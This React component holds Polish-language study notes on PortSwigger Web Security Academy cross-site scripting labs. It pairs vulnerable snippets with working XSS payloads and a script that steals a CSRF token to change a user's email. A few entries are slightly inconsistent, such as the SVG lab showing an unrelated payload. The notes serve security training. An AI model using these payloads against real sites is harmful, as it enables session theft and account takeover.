const XSS = () =>{
    return(        
        <details>
            <summary>XSS - injection</summary>
            
            <details>
                <summary>DOM XSS w document.write przy użyciu lokalizacji location.search</summary>
                <p>Mamy w kodzie <span className="important">{`<script>document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">') ...</script>`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>{`"><svg onload=alert(1)>`}</p>
                </div>
            </details>

            <details>
                <summary>DOM XSS w document.innerHTML przy użyciu lokalizacji location.search</summary>
                <p>Mamy w kodzie <span className="important">{`<script>document.getElementById('searchMessage').innerHTML = query ...</script>`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>{`<img src=1 onerror=alert(1)>`}</p>
                </div>
            </details>
            
            <details>
                <summary>DOM XSS w jQuery anchor href atrybut sink przy użyciu źródła </summary>
                <p>Mamy url https://0abc002d03e66162802e1ce6002100b4.web-security-academy.net/feedback?<span className="important">{`returnPath=/`}</span></p>
                                <p>Mamy w kodzie <span className="important">{`<script>
                            $(function() {
                                $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
                            });
                        </script>`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>{`javascript:alert(document.cookie)`}</p>
                    <p>https://0abc002d03e66162802e1ce6002100b4.web-security-academy.net/feedback?returnPath=/javascript:alert(document.cookie)</p>
                </div>
            </details>

            <details>
                <summary>Reflected XSS w atrybucie elementu HTML</summary>
                    <p>Mamy w kodzie <span className="important">{`<input type="text" placeholder="Search the blog..." name="search" value="...">`}</span></p>
                    <div className="waring">
                        <p className="result">Rozwiązanie:</p>
                        <p>{`"onmouseover="alert(1)`}</p>
                        <p>{`<input type="text" placeholder="Search the blog..." name="search" value=""onmouseover="alert(1)">`}</p>
                    </div>
            </details>

            <details>
                <summary>Reflected XSS w atrybucie href elementu HTML</summary>
                    <p>Mamy możliwość w formularzu w <span className="important">polu website</span> dodać XSS który będzie zamieszczony w <span className="important">href</span> w name</p>
                    <div className="waring">
                        <p className="result">Rozwiązanie:</p>
                        <p>Website field {`->`} {`javascript:alert(1)`}</p>
                    </div>
            </details>

            <details>   
                <summary>Reflected XSS w JavaScript z zakodowany w formacie HTML</summary>
                <p>Mamy w kodzie</p>
                <p><span className="important">{`<script>`}</span></p>
                   <p><span className="important">{`var searchTerms = '';`}</span></p>
                    <p><span className="important">{`document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');`}</span></p>
                <p><span className="important">{`</script>`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>{`'-alert(1)-'`}</p>
                </div>
            </details>

            <details>
                <summary>DOM XSS w document.write przy użyciu source/ źródła location.search wewnątrz elementu select</summary>
                <p>Mamy w kodzie </p>
                <p><span className="important">{`<script>var store = (new URLSearchParams(window.location.search)).get('storeId');`}<br/>{`
                                document.write('<select name="storeId">');`}<br/>{`
                                if(store) {`}<br/>{`
                                    document.write('<option selected>'+store+'</option>');`}<br/>{`
                                } ...</script>`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>Dodanie w url {`->`} {`&storeId="></select><img%20src=1%20onerror=alert(1)>`}</p>
                    <p className="result">Rezultat:</p>
                    <p>{`</select>`}</p>
                    <p>{`<img src="1" onerror="alert(1)">`}</p>
                </div>
            </details>

            <details>
                <summary>Reflected DOM XSS w funkcji eval</summary>
                <p>W plikach źródłowych w plikach .js możemy zauważyć funkcję eval()</p>
                <p><span className="important">{`eval('var searchResultsObj = ' + this.responseText);`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>\{`"-alert(1)}//`}</p>
                    <p className="result">Uzasadnienie:</p>
                    <p>Ponieważ wstrzyknąłeś ukośnik odwrotny, a witryna go nie unika, gdy odpowiedź JSON próbuje uniknąć otwierającego znaku cudzysłowu, dodaje drugi ukośnik odwrotny. Powstały podwójny ukośnik odwrotny powoduje, że ucieczka jest skutecznie anulowana. Oznacza to, że cudzysłowy są przetwarzane bez znaku ucieczki, co zamyka ciąg, który powinien zawierać termin wyszukiwania.
                        Następnie operator arytmetyczny (w tym przypadku operator odejmowania) jest używany do rozdzielenia wyrażeń przed wywołaniem funkcji alert(). Na koniec zamykający nawias klamrowy i dwa ukośniki zamykają obiekt JSON wcześniej i komentują to, co mogłoby być resztą obiektu. W rezultacie odpowiedź jest generowana w następujący sposób:</p>
                    <p>{`{"searchTerm":"`}\\{`"-alert(1)}//", "results":[]}`}</p>
                </div>
            </details>

            <details>   
                <summary>Reflected XSS w JavaScript z zakodowany w formacie HTML</summary>
                <p>W plikach źródłowych w plikach .js możemy zauważyć funkcję escapeHTML()</p>
                   <p><span className="important">{`function escapeHTML(html) {`}</span></p>
                    <p><span className="important">{`return html.replace('<', '&lt;').replace('>', '&gt;');`}</span></p>
                <p><span className="important">{`}`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>{`<><img src=1 onerror=alert(1)>`}</p>
                </div>
            </details>

            <details>   
                <summary>Reflected XSS do kontekstu HTML z zablokowaną większością tagów i atrybutów</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p> 
                    <p>{`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`}</p>
                    <p className="result">Uzasadnienie:</p>
                    <p>Wstrzykujemy kod html w search onResize po czym zmieniamy szerokość iframe</p> 
                </div>
            </details>
            
            <details>   
                <summary>Reflected XSS do kontekstu HTML, blokując wszystkie tagi oprócz niestandardowych</summary>
                <p>Jest możliwość wstrzyknięcie xss poprzez URL <span className="important">?search=</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p> 
                    <p>{`<xss id="x" onfocus="alert(document.cookie)" tabindex="1">`}</p>
                    <p>Kodujemy url</p>
                    <p>{`https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x`}</p>
                </div>
            </details>
            
            <details>   
                <summary>Reflected XSS z tagiem SVG</summary>
                <p>Jest możliwość wstrzyknięcie xss poprzez URL <span className="important">?search=</span></p>
                <p><span className="important">{`<svg>`}</span></p>
                <p><span className="important">{`<animateTransform onbegin="alert(1)">'</animateTransform>`}</span></p>
                <p><span className="important">{`</svg>`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p> 
                    <p>{`<xss id="x" onfocus="alert(document.cookie)" tabindex="1">`}</p>
                    <p>{`https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`}</p>
                </div>
            </details>
            
            <details>   
                <summary>Reflected XSS w canonical link tag</summary>
                <p>Jest możliwość wstrzyknięcie xss poprzez canonical URL <span className="important">{`<link rel="canonical" href='https://0aca0009048b9cec8004033b00a20044.web-security-academy.net'/>`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p> 
                    <p>Dodajemy w url {`->`} {`?'accesskey='x'onclick='alert(1)`}</p>
                    <p>{`https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`}</p>
                    <p><span className="important">{`<link rel="canonical" href='https://0aca0009048b9cec8004033b00a20044.web-security-academy.net/?'accesskey='x'onclick='alert(1)'/>`}</span></p>
                </div>
            </details>
            
            <details>   
                <summary>Reflected XSS do ciągu JavaScript z pojedynczym cudzysłowem i ukośnikiem odwrotnym</summary>
                <p>W kodzie mamy</p>
                <p><span className="important">{`<script>`}</span></p>
                <p><span className="important">{`var searchTerms = 't';`}</span></p>
                <p><span className="important">{`document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');`}</span></p>
                <p><span className="important">{`</script>`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p> 
                    <p>{`</script><script>alert(1)</script>`}</p>
                </div>
            </details>

            <details>   
                <summary>Reflected XSS w JavaScript z nawiasami kątowymi i podwójnymi cudzysłowami zakodowanymi w formacie HTML i pojedynczymi cudzysłowami</summary>
                <p>W kodzie mamy</p>
                <p><span className="important">{`<script>`}</span></p>
                <p><span className="important">{`var searchTerms = 't';`}</span></p>
                <p><span className="important">{`document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');`}</span></p>
                <p><span className="important">{`</script>`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p> 
                    <p>\{`'-alert(1)//>`}</p>
                </div>
            </details>

            <details>   
                <summary>Reflected XSS w zdarzeniu onclick z nawiasami kątowymi i cudzysłowami zakodowanymi w formacie HTML oraz pojedynczymi cudzysłowami i ukośnikiem odwrotnym</summary>
                <p>W polu website w formularzu można wstrzyknąć XSS</p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p> 
                    <p>{`http://foo?&apos;-alert(1)-&apos;`}</p>
                </div>
            </details>

            <details>   
                <summary>Reflected XSS do szablonu literału z nawiasami kątowymi, pojedynczymi i podwójnymi cudzysłowami, ukośnikiem odwrotnym i znakami odwrotnymi Unicode escaped</summary>
                <p>W kodzie mamy</p>
                <p><span className="important">{`<script>`}</span></p>
                <p><span className="important">{`var message = 5 search results for 'w';`}</span></p>
                <p><span className="important">{`document.getElementById('searchMessage').innerText = message;`}</span></p>
                <p><span className="important">{`</script>`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p> 
                    <p>${`{alert(1)}`}</p>
                </div>
            </details>

            <details>   
                <summary>Wykorzystanie XSS do ominięcia zabezpieczeń CSRF</summary>
                <p>W kodzie mamy przy zmianie emain mamy vartość CSRF</p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p> 
                    <p>{`<script>`}</p>
                    <p>{`var req = new XMLHttpRequest();`}</p>
                    <p>{`req.onload = handleResponse;`}</p>
                    <p>{`req.open('get','/my-account',true);`}</p>
                    <p>{`req.send();`}</p>
                    <p>{`function handleResponse() {`}</p>
                    <p className="tab-1">{`var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];`}</p>
                    <p className="tab-1">{`var changeReq = new XMLHttpRequest();`}</p>
                    <p className="tab-1">{`changeReq.open('post', '/my-account/change-email', true);`}</p>
                    <p className="tab-1">{`changeReq.send('csrf='+token+'&email=test@test.com')`}</p>
                    <p>{`};`}</p>
                    <p>{`</script>`}</p>
                </div>
            </details>
            
            <details>   
                <summary>Reflected XSS z obsługą zdarzeń i zablokowanymi atrybutami href</summary>
                <p>W kodzie mamy</p>
                <p><span className="important">{`<script>`}</span></p>
                <p><span className="important">{`var message = 5 search results for 'w';`}</span></p>
                <p><span className="important">{`document.getElementById('searchMessage').innerText = message;`}</span></p>
                <p><span className="important">{`</script>`}</span></p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p> 
                    <p>{`<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Clickme</text></a>`}</p>
                    <p>Zakodować do url</p>
                    <p>https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E</p>
                </div>
            </details>
       
        </details>
        )
}

export default XSS;